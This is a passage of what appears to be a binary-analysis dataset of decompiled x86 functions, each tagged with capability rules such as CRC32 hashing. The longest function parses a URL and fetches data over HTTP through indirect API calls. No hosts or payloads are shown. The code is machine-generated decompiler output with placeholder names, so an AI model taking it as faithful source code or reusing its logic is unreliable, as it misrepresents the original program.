uint32_t var_9c8h;\n    uint32_t var_9c0h;\n    uint var_9b0h;\n    uint32_t var_9ach;\n    uint *var_9a4h;\n    uint var_994h;\n    uint32_t var_990h;\n    uint *var_988h;\n    uint var_978h;\n    uint32_t var_974h;\n    uint *var_96ch;\n    int32_t var_95ch;\n    uint32_t var_958h;\n    uint *var_950h;\n    uint var_940h;\n    uint32_t var_93ch;\n    uint32_t var_934h;\n    uint var_924h;\n    uint32_t var_920h;\n    uint *var_918h;\n    uint32_t var_908h;\n    uint32_t var_904h;\n    uint *var_8fch;\n    uint var_8ech;\n    uint32_t var_8e8h;\n    uint var_8e0h;\n    uint var_110h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x43dc0b;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_a28h = arg_8h;\n    var_a18h = 0;\n    var_4h = 1;\n    var_9ach = 0xf;\n    var_9b0h = 0;\n    var_9c0h = var_9c0h & 0xffffff00;\n    uVar1 = fcn.0042ad20(0x4452bc, var_10h);\n    fcn.004062a0(0x4452bc, uVar1);\n    var_93ch = 0xf;\n    var_940h = 0;\n    var_950h = var_950h & 0xffffff00;\n    var_958h = 0xf;\n    var_95ch = 0;\n    var_96ch = var_96ch & 0xffffff00;\n    var_904h = 0xf;\n    var_908h = 0;\n    var_918h = var_918h & 0xffffff00;\n    var_990h = 0xf;\n    var_994h = 0;\n    var_9a4h = var_9a4h & 0xffffff00;\n    var_974h = 0xf;\n    var_978h = 0;\n    var_988h = var_988h & 0xffffff00;\n    var_9e4h = 0xf;\n    var_9e8h = 0;\n    var_9f8h = var_9f8h & 0xffffff00;\n    var_4h._0_1_ = 8;\n    var_a1ch = 0;\n    uVar1 = fcn.0040d9e0(&var_934h, &arg_ch);\n    var_4h._0_1_ = 9;\n    fcn.004063e0(uVar1);\n    var_4h = CONCAT31(var_4h._1_3_, 8);\n    if (0xf < var_920h) {\n        fcn.0042a679(var_934h);\n    }\n    uVar2 = fcn.0042ad20(0x44705c);\n    uVar10 = 8;\n    if (var_908h < 8) {\n        uVar10 = var_908h;\n    }\n    uVar4 = uVar10;\n    if (uVar2 <= uVar10) {\n        uVar4 = uVar2;\n    }\n    puVar5 = var_918h;\n    if (var_904h < 0x10) {\n        puVar5 = &var_918h;\n    }\n    iVar3 = fcn.0042bc6b(puVar5, 0x44705c, uVar4);\n    if (((iVar3 == 0) && (uVar2 <= uVar10)) && (uVar10 == uVar2)) {\n        var_a1ch = 8;\n    }\n    else {\n        uVar2 = fcn.0042ad20(0x446ef0);\n        uVar10 = 7;\n        if (var_908h < 7) {\n            uVar10 = var_908h;\n        }\n        uVar4 = uVar10;\n        if (uVar2 <= uVar10) {\n            uVar4 = uVar2;\n        }\n        puVar5 = var_918h;\n        if (var_904h < 0x10) {\n            puVar5 = &var_918h;\n        }\n        iVar3 = fcn.0042bc6b(puVar5, 0x446ef0, uVar4);\n        if (((iVar3 == 0) && (uVar2 <= uVar10)) && (uVar10 == uVar2)) {\n            var_a1ch = 7;\n        }\n    }\n    var_a20h._0_1_ = 0x2f;\n    iVar3 = fcn.0040b950(&var_a20h, var_a1ch + 1, 1);\n    if (iVar3 == -1) {\n        var_8e8h = 0xf;\n        var_8ech = 0;\n        var_8fch = var_8fch & 0xffffff00;\n        uVar1 = fcn.0042ad20(0x4452bc);\n        fcn.004062a0(0x4452bc, uVar1);\n        puVar5 = &var_8fch;\n        var_4h = CONCAT31(var_4h._1_3_, 10);\n        uVar10 = 1;\n    }\n    else {\n        puVar5 = fcn.0040e6b0(&var_9dch, iVar3, 0xffffffff);\n        var_4h = 0xb;\n        uVar10 = 2;\n    }\n    var_a18h = uVar10;\n    fcn.004063e0(puVar5);\n    if ((uVar10 & 2) != 0) {\n        uVar10 = uVar10 & 0xfffffffd;\n        var_a18h = uVar10;\n        if (0xf < var_9c8h) {\n            fcn.0042a679(var_9dch);\n        }\n        var_9c8h = 0xf;\n        var_9cch = 0;\n        var_9dch = var_9dch & 0xffffff00;\n    }\n    var_4h = 8;\n    if (((uVar10 & 1) != 0) && (uVar10 = uVar10 & 0xfffffffe,  var_a18h = uVar10,  0xf < var_8e8h)) {\n        fcn.0042a679(var_8fch);\n    }\n    if (iVar3 == -1) {\n        puVar5 = var_918h;\n        if (var_904h < 0x10) {\n            puVar5 = &var_918h;\n        }\n        iVar3 = puVar5 + var_908h;\n    }\n    else {\n        puVar5 = var_918h;\n        if (var_904h < 0x10) {\n            puVar5 = &var_918h;\n        }\n        iVar3 = puVar5 + iVar3;\n    }\n    puVar5 = var_918h;\n    if (var_904h < 0x10) {\n        puVar5 = &var_918h;\n    }\n    var_8e8h = 0xf;\n    var_8ech = 0;\n    var_8fch = var_8fch & 0xffffff00;\n    fcn.0040bd00(puVar5 + var_a1ch, iVar3, var_a2ch);\n    var_4h._0_1_ = 0xc;\n    fcn.004063e0(&var_8fch);\n    var_4h._0_1_ = 8;\n    if (0xf < var_8e8h) {\n        fcn.0042a679(var_8fch);\n    }\n    uVar1 = fcn.0042ad20(0x447058);\n    iVar3 = fcn.0040b950(0x447058, 0, uVar1);\n    if (iVar3 == -1) {\n        var_8e8h = 0xf;\n        var_8ech = 0;\n        var_8fch = var_8fch & 0xffffff00;\n        fcn.004061b0(&var_950h, 0, 0xffffffff);\n        puVar5 = &var_8fch;\n        var_4h = 0xe;\n        uVar10 = uVar10 | 8;\n    }\n    else {\n        puVar5 = fcn.0040e6b0(&var_934h, 0, iVar3);\n        var_4h = CONCAT31(var_4h._1_3_, 0xd);\n        uVar10 = uVar10 | 4;\n    }\n    var_a18h = uVar10;\n    fcn.004063e0(puVar5);\n    if ((uVar10 & 8) != 0) {\n        uVar10 = uVar10 & 0xfffffff7;\n        var_a18h = uVar10;\n        if (0xf < var_8e8h) {\n            fcn.0042a679(var_8fch);\n        }\n        var_8e8h = 0xf;\n        var_8ech = 0;\n        var_8fch = var_8fch & 0xffffff00;\n    }\n    var_4h = 8;\n    if (((uVar10 & 4) != 0) && (uVar10 = uVar10 & 0xfffffffb,  var_a18h = uVar10,  0xf < var_920h)) {\n        fcn.0042a679(var_934h);\n    }\n    uVar1 = fcn.0042ad20(0x446ed4);\n    iVar3 = fcn.0040b950(0x446ed4, 0, uVar1);\n    if (iVar3 == -1) {\n        var_8e8h = 0xf;\n        var_8ech = 0;\n        var_8fch = var_8fch & 0xffffff00;\n        uVar1 = fcn.0042ad20(0x4452bc);\n        fcn.004062a0(0x4452bc, uVar1);\n        puVar5 = &var_8fch;\n        var_4h = 0x10;\n        uVar10 = uVar10 | 0x20;\n    }\n    else {\n        puVar5 = fcn.0040e6b0(&var_934h, iVar3 + 1, 0xffffffff);\n        var_4h = CONCAT31(var_4h._1_3_, 0xf);\n        uVar10 = uVar10 | 0x10;\n    }\n    var_a18h = uVar10;\n    fcn.004063e0(puVar5);\n    if ((uVar10 & 0x20) != 0) {\n        uVar10 = uVar10 & 0xffffffdf;\n        var_a18h = uVar10;\n        if (0xf < var_8e8h) {\n            fcn.0042a679(var_8fch);\n        }\n        var_8e8h = 0xf;\n        var_8ech = 0;\n        var_8fch = var_8fch & 0xffffff00;\n    }\n    var_4h = 8;\n    if (((uVar10 & 0x10) != 0) && (uVar10 = uVar10 & 0xffffffef,  var_a18h = uVar10,  0xf < var_920h)) {\n        fcn.0042a679(var_934h);\n    }\n    if (iVar3 == -1) {\n        iVar3 = var_95ch;\n    }\n    uVar1 = fcn.0040e6b0(&var_934h, 0, iVar3);\n    var_4h._0_1_ = 0x11;\n    fcn.004063e0(uVar1);\n    var_4h._0_1_ = 8;\n    if (0xf < var_920h) {\n        fcn.0042a679(var_934h);\n    }\n    if (var_a1ch < 1) {\n        var_8e8h = 0xf;\n        var_8ech = 0;\n        var_8fch = var_8fch & 0xffffff00;\n        uVar1 = fcn.0042ad20(0x4452bc);\n        fcn.004062a0(0x4452bc, uVar1);\n        puVar5 = &var_8fch;\n        var_4h = 0x13;\n        uVar10 = uVar10 | 0x80;\n    }\n    else {\n        puVar5 = fcn.0040e6b0(&var_934h, 0, var_a1ch + -3);\n        var_4h = CONCAT31(var_4h._1_3_, 0x12);\n        uVar10 = uVar10 | 0x40;\n    }\n    var_a18h = uVar10;\n    fcn.004063e0(puVar5);\n    if (uVar10 < '\\0') {\n        uVar10 = uVar10 & 0xffffff7f;\n        var_a18h = uVar10;\n        if (0xf < var_8e8h) {\n            fcn.0042a679(var_8fch);\n        }\n        var_8e8h = 0xf;\n        var_8ech = 0;\n        var_8fch = var_8fch & 0xffffff00;\n    }\n    var_4h = 8;\n    if (((uVar10 & 0x40) != 0) && (uVar10 = uVar10 & 0xffffffbf,  var_a18h = uVar10,  0xf < var_920h)) {\n        fcn.0042a679(var_934h);\n    }\n    uVar1 = fcn.0042ad20(0x447054);\n    iVar3 = fcn.0040b950(0x447054, 0, uVar1);\n    if (iVar3 == -1) {\n        var_8e8h = 0xf;\n        var_8ech = 0;\n        var_8fch = var_8fch & 0xffffff00;\n        uVar1 = fcn.0042ad20(0x4452bc);\n        fcn.004062a0(0x4452bc, uVar1);\n        puVar5 = &var_8fch;\n        var_4h = 0x15;\n        uVar10 = uVar10 | 0x200;\n    }\n    else {\n        puVar5 = fcn.0040e6b0(&var_934h, iVar3 + 1, 0xffffffff);\n        var_4h = CONCAT31(var_4h._1_3_, 0x14);\n        uVar10 = uVar10 | 0x100;\n    }\n    var_a18h = uVar10;\n    fcn.004063e0(puVar5);\n    if ((uVar10 & 0x200) != 0) {\n        uVar10 = uVar10 & 0xfffffdff;\n        var_a18h = uVar10;\n        if (0xf < var_8e8h) {\n            fcn.0042a679(var_8fch);\n        }\n        var_8e8h = 0xf;\n        var_8ech = 0;\n        var_8fch = var_8fch & 0xffffff00;\n    }\n    var_4h = 8;\n    if (((uVar10 & 0x100) != 0) && (uVar10 = uVar10 & 0xfffffeff,  var_a18h = uVar10,  0xf < var_920h)) {\n        fcn.0042a679(var_934h);\n    }\n    if (iVar3 == -1) {\n        var_8e8h = 0xf;\n        var_8ech = 0;\n        var_8fch = var_8fch & 0xffffff00;\n        fcn.004061b0(&var_950h, 0, 0xffffffff);\n        puVar5 = &var_8fch;\n        var_4h = 0x17;\n        uVar10 = uVar10 | 0x800;\n    }\n    else {\n        puVar5 = fcn.0040e6b0(&var_934h, 0, iVar3);\n        var_4h = CONCAT31(var_4h._1_3_, 0x16);\n        uVar10 = uVar10 | 0x400;\n    }\n    var_a18h = uVar10;\n    fcn.004063e0(puVar5);\n    if ((uVar10 & 0x800) != 0) {\n        uVar10 = uVar10 & 0xfffff7ff;\n        if (0xf < var_8e8h) {\n            fcn.0042a679(var_8fch);\n        }\n        var_8e8h = 0xf;\n        var_8ech = 0;\n        var_8fch = var_8fch & 0xffffff00;\n    }\n    var_4h = 8;\n    if (((uVar10 & 0x400) != 0) && (0xf < var_920h)) {\n        fcn.0042a679(var_934h);\n    }\n    puVar5 = var_96ch;\n    if (var_958h < 0x10) {\n        puVar5 = &var_96ch;\n    }\n    (**0x462f54)(puVar5);\n    puVar5 = arg_ch;\n    if (arg_20h < 0x10) {\n        puVar5 = &arg_ch;\n    }\n    (**0x462f54)(puVar5);\n    if (arg_28h == 0) {\n        puVar5 = arg_2ch;\n        if (arg_40h < 0x10) {\n            puVar5 = &arg_2ch;\n        }\n        iVar3 = (**0x462f74)(puVar5, 0, 0, 0, 0);\n        var_a1ch = iVar3;\n    }\n    else {\n        puVar6 = fcn.00420610(&var_9dch);\n        var_4h._0_1_ = 0x18;\n        if (0xf < puVar6[5]) {\n            puVar6 = *puVar6;\n        }\n        puVar5 = NULL;\n        iVar3 = (**0x462f74)(puVar6, 0, 0, 0, 0);\n        var_4h = CONCAT31(var_4h._1_3_, 8);\n        var_a1ch = iVar3;\n        if (0xf < var_9c8h) {\n            fcn.0042a679(var_9dch);\n        }\n        var_9c8h = 0xf;\n        var_9cch = 0;\n        var_9dch = var_9dch & 0xffffff00;\n    }\n    puVar6 = var_988h;\n    if (var_974h < 0x10) {\n        puVar6 = &var_988h;\n    }\n    uVar1 = fcn.0042d410(puVar6);\n    puVar6 = var_9a4h;\n    if (var_990h < 0x10) {\n        puVar6 = &var_9a4h;\n    }\n    iVar7 = (**0x463068)(puVar6, 0x44704c);\n    iVar7 = (-(iVar7 != 0) & 0xff800000) + 0x4800000;\n    if (iVar3 != 0) {\n        puVar6 = var_96ch;\n        if (var_958h < 0x10) {\n            puVar6 = &var_96ch;\n        }\n        iVar3 = (**0x463090)(var_a1ch, puVar6, uVar1, 0, 0, 3, iVar7, 0);\n        if (iVar3 != 0) {\n            puVar6 = var_950h;\n            if (var_93ch < 0x10) {\n                puVar6 = &var_950h;\n            }\n            iVar7 = (**0x4630d4)(iVar3, 0x447048, puVar6, 0, 0, 0, iVar7, 0);\n            if (iVar7 != 0) {\n                uVar1 = fcn.0040beb0(&var_934h);\n                var_4h._0_1_ = 0x19;\n                fcn.00406490(&var_8fch, 0x447040, uVar1);\n                var_4h = CONCAT31(var_4h._1_3_, 0x1b);\n                if (0xf < var_920h) {\n                    fcn.0042a679(var_934h);\n                }\n                var_920h = 0xf;\n                var_924h = 0;\n                var_934h = var_934h & 0xffffff00;\n                puVar6 = var_8fch;\n                if (var_8e8h < 0x10) {\n                    puVar6 = &var_8fch;\n                }\n                (**0x462ea4)(iVar7, puVar6, var_8ech, 0x20000000);\n                iVar8 = (**0x463054)(iVar7, 0, 0, 0, 0);\n                var_a2ch = 0x100;\n                iVar9 = (**0x4630ec)(iVar7, 0x13, &var_110h, &var_a2ch, 0);\n                if ((iVar9 == 0) || (iVar9 = fcn.0042d410(&var_110h),  iVar9 != 200)) {\n                    fcn.004063a0(0x447038);\n                    fcn.00405d10();\n                    fcn.00405d10();\n                    fcn.00405d10();\n                    fcn.00405d10();\n                    fcn.00405d10();\n                    fcn.00405d10();\n                    fcn.00405d10();\n                    fcn.00405d10();\n                    fcn.00405d10();\n                    fcn.00405d10();\n                    goto code_r0x0040fdcf;\n                }\n                if (iVar8 != 0) {\n                    iVar8 = (**0x462f98)(iVar7, &var_8e0h, 1999, &var_a18h);\n                    while ((iVar8 != 0 && (var_a18h != 0))) {\n                        *(&var_8e0h + var_a18h) = 0;\n                        uVar1 = fcn.0040e740(&var_a14h, &var_9c0h, &var_8e0h);\n                        var_4h._0_1_ = 0x1c;\n                        fcn.004063e0(uVar1);\n                        var_4h = CONCAT31(var_4h._1_3_, 0x1b);\n                        if (0xf < var_a00h) {\n                            fcn.0042a679(var_a14h);\n                        }\n                        iVar8 = (**0x462f98)(iVar7, &var_8e0h, 1999, &var_a18h);\n                    }\n                }\n                (**0x462f70)(iVar7);\n                var_4h = CONCAT31(var_4h._1_3_, 8);\n                fcn.00405d10();\n            }\n            (**0x462f70)(iVar3);\n        }\n        (**0x462f70)(var_a1ch);\n    }\n    *(var_a28h + 0x14) = 0xf;\n    *(var_a28h + 0x10) = 0;\n    *var_a28h = 0;\n    fcn.004063e0(&var_9c0h);\n    if (0xf < var_9e4h) {\n        fcn.0042a679(var_9f8h);\n    }\n    var_9e4h = 0xf;\n    var_9e8h = 0;\n    var_9f8h = var_9f8h & 0xffffff00;\n    if (0xf < var_974h) {\n        fcn.0042a679(var_988h);\n    }\n    var_974h = 0xf;\n    var_978h = 0;\n    var_988h = var_988h & 0xffffff00;\n    if (0xf < var_990h) {\n        fcn.0042a679(var_9a4h);\n    }\n    var_990h = 0xf;\n    var_994h = 0;\n    var_9a4h = var_9a4h & 0xffffff00;\n    if (0xf < var_904h) {\n        fcn.0042a679(var_918h);\n    }\n    var_904h = 0xf;\n    var_908h = 0;\n    var_918h = var_918h & 0xffffff00;\n    if (0xf < var_958h) {\n        fcn.0042a679(var_96ch);\n    }\n    var_958h = 0xf;\n    var_95ch = 0;\n    var_96ch = var_96ch & 0xffffff00;\n    if (0xf < var_93ch) {\n        fcn.0042a679(var_950h);\n    }\n    var_93ch = 0xf;\n    var_940h = 0;\n    var_950h = var_950h & 0xffffff00;\n    if (0xf < var_9ach) {\n        fcn.0042a679(var_9c0h);\n    }\n    var_9ach = 0xf;\n    var_9b0h = 0;\n    var_9c0h = var_9c0h & 0xffffff00;\n    if (0xf < arg_20h) {\n        fcn.0042a679(arg_ch);\n    }\n    arg_20h = 0xf;\n    arg_1ch = 0;\n    arg_ch = arg_ch & 0xffffff00;\n    if (0xf < arg_40h) {\n        fcn.0042a679(arg_2ch);\n    }\ncode_r0x0040fdcf:\n    *in_FS_OFFSET = var_ch;\n    fcn.0042a75a(puVar5);\n    return;\n}\n",
        "token_count": 6464
    },
    "00418200": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418200(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x447298;\n    fcn.0042a309(in_ECX);\n    if ((arg_8h & 1) != 0) {\n        fcn.0042a679();\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "004183b0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004183b0(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x4477d0;\n    if (in_ECX[5] < 1) {\n        if (in_ECX[5] < 0) {\n            fcn.0042bc28(in_ECX[4]);\n        }\n    }\n    else {\n        fcn.0042a7fd(in_ECX[4]);\n    }\n    *in_ECX = 0x447290;\n    if ((arg_8h & 1) != 0) {\n        fcn.0042a679();\n    }\n    return;\n}\n",
        "token_count": 151
    },
    "00418400": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418400(uint32_t arg_8h)\n\n{\n    fcn.0042aca3();\n    if ((arg_8h & 1) != 0) {\n        fcn.0042a679();\n    }\n    return;\n}\n",
        "token_count": 59
    },
    "004189a0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.004189a0(uint32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    uint *in_ECX;\n    \n    piVar1 = in_ECX + -4;\n    *(*(*piVar1 + 4) + -0x10 + in_ECX) = 0x4477c0;\n    *in_ECX = 0x447298;\n    fcn.0042a309(in_ECX);\n    if ((arg_8h & 1) != 0) {\n        fcn.0042a679(piVar1);\n    }\n    return piVar1;\n}\n",
        "token_count": 142
    },
    "004189e0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004189e0(uint32_t arg_8h)\n\n{\n    fcn.00418650();\n    if ((arg_8h & 1) != 0) {\n        fcn.0042a679();\n    }\n    return;\n}\n",
        "token_count": 59
    },
    "00418cc0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00418cc0(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint *puVar3;\n    bool bVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t arg_8h_00;\n    uint var_44h;\n    uint var_20h;\n    uint *var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43e41b;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    bVar4 = false;\n    var_10h = NULL;\n    if ((arg_8h != NULL) && (*arg_8h == 0)) {\n        arg_8h_00 = 0x18;\n        puVar2 = fcn.0042b2b1(0x18);\n        var_4h = 0;\n        var_10h = puVar2;\n        if (puVar2 == NULL) {\n            puVar2 = NULL;\n        }\n        else {\n            arg_8h_00 = *(*arg_ch + 0x18);\n            if (arg_8h_00 == 0) {\n                arg_8h_00 = *arg_ch + 0x1c;\n            }\n            fcn.00418b60(arg_8h_00);\n            bVar4 = true;\n            puVar2[1] = 0;\n            *puVar2 = 0x4477d0;\n            puVar3 = fcn.00429d51(&var_20h);\n            puVar2[2] = *puVar3;\n            puVar2[3] = puVar3[1];\n            puVar2[4] = puVar3[2];\n            puVar2[5] = puVar3[3];\n        }\n        var_4h = 0xffffffff;\n        *arg_8h = puVar2;\n        if (bVar4) {\n            fcn.00418c10(arg_8h_00, uVar1);\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    return 2;\n}\n",
        "token_count": 529
    },
    "004190f0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004190f0(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    bool bVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t arg_8h_00;\n    uint var_34h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43e47b;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    bVar3 = false;\n    if ((arg_8h != NULL) && (*arg_8h == 0)) {\n        arg_8h_00 = 8;\n        puVar2 = fcn.0042b2b1(8);\n        var_4h = 0;\n        if (puVar2 == NULL) {\n            puVar2 = NULL;\n        }\n        else {\n            arg_8h_00 = *(*arg_ch + 0x18);\n            if (arg_8h_00 == 0) {\n                arg_8h_00 = *arg_ch + 0x1c;\n            }\n            fcn.00418b60(arg_8h_00);\n            bVar3 = true;\n            puVar2[1] = 0;\n            *puVar2 = 0x44789c;\n        }\n        var_4h = 0xffffffff;\n        *arg_8h = puVar2;\n        if (bVar3) {\n            fcn.00418c10(arg_8h_00, uVar1);\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    return 2;\n}\n",
        "token_count": 418
    },
    "004191f0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.004191f0(int32_t *param_1, char param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint arg_8h;\n    uint32_t uVar3;\n    uint32_t arg_8h_00;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    uint var_8h;\n    uint var_10h;\n    uint var_ch;\n    uint var_14h;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43e4a8;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_2;\n    iVar4 = *(*param_1 + 4) + param_1;\n    if (*(*(*param_1 + 4) + 0xc + param_1) == 0) {\n        if (*(iVar4 + 0x3c) != 0) {\n            fcn.004191a0();\n        }\n        if ((var_8h == '\\0') && ((*(*(*param_1 + 4) + 0x14 + param_1) & 1) != 0)) {\n            arg_8h = fcn.004151b0(&param_2);\n            var_4h = 0;\n            iVar4 = fcn.00418fb0(arg_8h);\n            fcn.00415140();\n            piVar1 = *(*(*param_1 + 4) + 0x38 + param_1);\n            var_4h = 1;\n            if ((*piVar1[8] == NULL) || (*piVar1[0xc] < 1)) {\n                uVar3 = (**(*piVar1 + 0x18))();\n            }\n            else {\n                uVar3 = **piVar1[8];\n            }\n            while (uVar3 != 0xffffffff) {\n                if ((*(*(iVar4 + 0x10) + (uVar3 & 0xff) * 2) & 0x48) == 0) goto code_r0x004192e2;\n                uVar3 = fcn.00418da0();\n            }\n            uVar3 = *(*(*param_1 + 4) + 0xc + param_1);\n            arg_8h_00 = uVar3 | 1;\n            if (*(param_1 + *(*param_1 + 4) + 0x38) == 0) {\n                arg_8h_00 = uVar3 | 5;\n            }\n            fcn.00418440(arg_8h_00, 0);\ncode_r0x004192e2:\n            var_4h = 0xffffffff;\n        }\n        iVar2 = *param_1;\n        iVar4 = *(iVar2 + 4) + param_1;\n        if (*(iVar4 + 0xc) == 0) {\n            *in_FS_OFFSET = var_ch_2;\n            return CONCAT31(iVar2 >> 8, 1);\n        }\n    }\n    uVar3 = *(iVar4 + 0xc) | 2;\n    if (*(iVar4 + 0x38) == 0) {\n        uVar3 = *(iVar4 + 0xc) | 6;\n    }\n    uVar3 = fcn.00418440(uVar3, 0);\n    *in_FS_OFFSET = var_ch_2;\n    return uVar3 & 0xffffff00;\n}\n",
        "token_count": 794
    },
    "0041a600": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041a600(uint32_t arg_8h)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint *in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x43e658;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    *in_ECX = 0x4478dc;\n    var_4h = 0;\n    if ((in_ECX[0x15] != 0) && (*in_ECX[4] == in_ECX + 0x12)) {\n        uVar1 = in_ECX[0x10];\n        *in_ECX[4] = in_ECX[0xf];\n        *in_ECX[8] = uVar1;\n        *in_ECX[0xc] = 0;\n    }\n    if (*(in_ECX + 0x14) != '\\0') {\n        fcn.0041a310(uVar2);\n    }\n    var_4h = 0xffffffff;\n    fcn.00418650();\n    if ((arg_8h & 1) != 0) {\n        fcn.0042a679();\n    }\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 330
    },
    "0041cd50": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0041cd50(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    fcn.0041cc80();\n    *in_ECX = 0x447298;\n    fcn.0042a309(in_ECX);\n    if ((arg_8h & 1) != 0) {\n        fcn.0042a679(in_ECX + -0x1a);\n    }\n    return in_ECX + -0x1a;\n}\n",
        "token_count": 111
    },
    "00420dd0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00420dd0(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x40) & 1) != 0) {\n        fcn.0042a679(**(param_1 + 0x10));\n    }\n    **(param_1 + 0x10) = 0;\n    **(param_1 + 0x20) = 0;\n    **(param_1 + 0x30) = 0;\n    **(param_1 + 0x14) = 0;\n    **(param_1 + 0x24) = 0;\n    **(param_1 + 0x34) = 0;\n    *(param_1 + 0x40) = *(param_1 + 0x40) & 0xfffffffe;\n    *(param_1 + 0x3c) = 0;\n    return;\n}\n",
        "token_count": 206
    },
    "00420ef0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00420ef0(uint32_t *arg_8h, uint32_t arg_ch, uint32_t arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_4h;\n    \n    uVar2 = **(in_ECX + 0x24);\n    if ((uVar2 != 0) && (*(in_ECX + 0x3c) < uVar2)) {\n        *(in_ECX + 0x3c) = uVar2;\n    }\n    if (((arg_18h & 1) == 0) || (iVar5 = **(in_ECX + 0x20),  iVar5 == 0)) {\n        if (((arg_18h & 2) == 0) || (uVar2 = **(in_ECX + 0x24),  uVar2 == 0)) {\n            if ((arg_ch | arg_10h) == 0) goto code_r0x0042108d;\n        }\n        else {\n            if (arg_14h == 2) {\n                uVar3 = *(in_ECX + 0x3c) - **(in_ECX + 0x10);\n                arg_10h = arg_10h + (uVar3 >> 0x1f) + CARRY4(arg_ch, uVar3);\n                arg_ch = arg_ch + uVar3;\n            }\n            else if (arg_14h == 1) {\n                uVar3 = uVar2 - **(in_ECX + 0x10);\n                arg_10h = arg_10h + (uVar3 >> 0x1f) + CARRY4(arg_ch, uVar3);\n                arg_ch = arg_ch + uVar3;\n            }\n            else if (arg_14h != 0) {\n                arg_10h = *0x448784;\n                arg_ch = *0x448780;\n            }\n            if (-1 < arg_10h) {\n                uVar3 = *(in_ECX + 0x3c) - **(in_ECX + 0x10);\n                iVar5 = uVar3 >> 0x1f;\n                if ((arg_10h <= iVar5) && ((arg_10h < iVar5 || (arg_ch <= uVar3)))) {\n                    iVar5 = (**(in_ECX + 0x10) - uVar2) + arg_ch;\n                    **(in_ECX + 0x34) = **(in_ECX + 0x34) - iVar5;\n                    **(in_ECX + 0x24) = **(in_ECX + 0x24) + iVar5;\n                    goto code_r0x0042108d;\n                }\n            }\n        }\n    }\n    else {\n        if (arg_14h == 2) {\n            uVar2 = *(in_ECX + 0x3c) - **(in_ECX + 0x10);\n            arg_10h = arg_10h + (uVar2 >> 0x1f) + CARRY4(arg_ch, uVar2);\n            arg_ch = arg_ch + uVar2;\n        }\n        else if (arg_14h == 1) {\n            if ((arg_18h & 2) == 0) {\n                uVar2 = iVar5 - **(in_ECX + 0x10);\n                arg_10h = arg_10h + (uVar2 >> 0x1f) + CARRY4(arg_ch, uVar2);\n                arg_ch = arg_ch + uVar2;\n            }\n            else {\ncode_r0x00420f61:\n                arg_10h = *0x448784;\n                arg_ch = *0x448780;\n            }\n        }\n        else if (arg_14h != 0) goto code_r0x00420f61;\n        if 